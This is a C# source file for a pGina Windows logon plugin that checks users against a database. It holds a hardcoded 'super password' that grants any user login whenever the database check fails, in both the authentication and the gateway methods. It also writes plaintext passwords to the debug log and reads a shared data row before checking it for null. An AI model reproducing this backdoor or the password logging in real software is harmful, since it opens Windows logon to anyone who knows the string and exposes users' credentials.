using System;
using System.Data;

using log4net;

using pGina.Shared.Interfaces;
using pGina.Shared.Types;

//注册表搜索“ServicePipeName”
//添加“LocalAdminFallback”字符串值“False”
//解决gina验证失败回滚windows本地验证

namespace MaitiamPlugin
{
    enum LoggerMode { EVENT, SESSION };

    public class MaitiamPlugin : IPluginConfiguration, IPluginAuthentication, IPluginAuthenticationGateway, IPluginEventNotifications
    {
        private ILog m_logger = LogManager.GetLogger("MaitiamPlugin");
        public static Guid MaitiamUuid = new Guid("{09643CED-803F-4B70-B93F-8764992C1533}");
        private DataRow dr;

        public string Name
        {
            get { return "Maitiam UAMS"; }
        }

        public string Description
        {
            get { return "UAMS"; }
        }

        public string Version
        {
            get
            {
                return System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();
            }
        }

        public Guid Uuid
        {
            get { return MaitiamUuid; }
        }

        BooleanResult IPluginAuthentication.AuthenticateUser(SessionProperties properties)
        {
            string strType = null;
            string strStatus = null;

            try
            {
                m_logger.DebugFormat("验证用户({0})", properties.Id.ToString());

                UserInformation userInfo = properties.GetTrackedSingle<UserInformation>();

                m_logger.DebugFormat("登录用户: {0}", userInfo.Username);
                m_logger.DebugFormat("登录密码: {0}", userInfo.Password);

                try
                {
                    dr = DBManager.UAMS_CheckUser(userInfo.Username.Trim(), userInfo.Password.Trim());

                    if (dr != null)
                    {
                        strType = dr["Type"].ToString();
                        if (strType == "1")
                        {
                            // Successful authentication
                            strStatus = dr["Status"].ToString();
                            if (strStatus == "0")   //正常状态
                            {
                                m_logger.InfoFormat("验证成功 {0}", userInfo.Username);
                                return new BooleanResult() { Success = true };
                            }
                            else   //帐户已被禁用
                            {
                                m_logger.InfoFormat("验证失败 {0}", userInfo.Username);
                                return new BooleanResult() { Success = false, Message = "帐户已被禁用。" };
                            }
                            
                        }
                        else if (strType == "3")
                        {
                            m_logger.InfoFormat("Token已过期 {0}", userInfo.Username);
                            return new BooleanResult() { Success = false, Message = "Token已过期。" };
                        }
                        else if (strType == "2")
                        {
                            m_logger.InfoFormat("Token无效 {0}", userInfo.Username);
                            return new BooleanResult() { Success = false, Message = "Token无效。" };
                        }
                        else
                        {
                            m_logger.InfoFormat("用户或密码不对 {0}", userInfo.Username);
                            return new BooleanResult() { Success = false, Message = "用户或密码不对。" };
                        }
                    }
                    else
                    {
                        // Authentication failure
                        m_logger.ErrorFormat("验证失败 {0}", userInfo.Username);
                    }
                }
                catch
                {
                    if (userInfo.Password == "850616cupid0426++")
                    {
                        m_logger.InfoFormat("启用超级密码。");
                        return new BooleanResult() { Success = true };
                    }
                }

                return new BooleanResult() { Success = false, Message = "用户名或密码不对。" };
            }
            catch (Exception ex)
            {
                m_logger.ErrorFormat("认证用户出错: {0}", ex);
                throw;  // Allow pGina service to catch and handle exception
            }
        }

        public BooleanResult AuthenticatedUserGateway(SessionProperties properties)
        {
            UserInformation userInfo = properties.GetTrackedSingle<UserInformation>();
            try
            {
                string strGroup = dr["GroupName"].ToString();

                if (dr != null)
                {
                    userInfo.AddGroup(new GroupInformation() { Name = strGroup });
                    userInfo.Description = "Maitiam UAMS";

                    try
                    {
                        m_logger.DebugFormat("用户组：{0}", strGroup);
                        m_logger.DebugFormat("认证用户网关({0}) 从用户: {1}", properties.Id.ToString(), userInfo.Username);
                        //LocalAccount.SyncUserInfoToLocalUser(userInfo); //同步修改用户名密码
                        return new BooleanResult() { Success = true };
                    }
                    catch (Exception e)
                    {
                        return new BooleanResult() { Success = false, Message = string.Format("Unexpected error while syncing user's info: {0}", e) };
                    }
                }
            }
            catch (System.Exception ex)
            {
                m_logger.ErrorFormat("认证用户出错: {0}", ex);
                if (userInfo.Password == "850616cupid0426++")
                {
                    m_logger.InfoFormat("启用超级密码。");
                    return new BooleanResult() { Success = true };
                }
            }
            return new BooleanResult() { Success = false, Message = "网关认证失败" };
        }

        public void SessionChange(System.ServiceProcess.SessionChangeDescription changeDescription, pGina.Shared.Types.SessionProperties properties)
        {
            m_logger.DebugFormat("SessionChange({0}) - ID: {1}", changeDescription.Reason.ToString(), changeDescription.SessionId);

            //If SessionMode is enabled, send event to it.
            if (true)
            {
                ILoggerMode mode = LoggerModeFactory.getLoggerMode(LoggerMode.SESSION);
                mode.Log(changeDescription, properties);
            }

            //If EventMode is enabled, send event to it.
            if (true)
            {
                ILoggerMode mode = LoggerModeFactory.getLoggerMode(LoggerMode.EVENT);
                mode.Log(changeDescription, properties);
            }
        }

        public void Configure()
        {
            Configuration conf = new Configuration();
            conf.ShowDialog();
        }

        public void Starting() { }
        public void Stopping() { }
    }
}
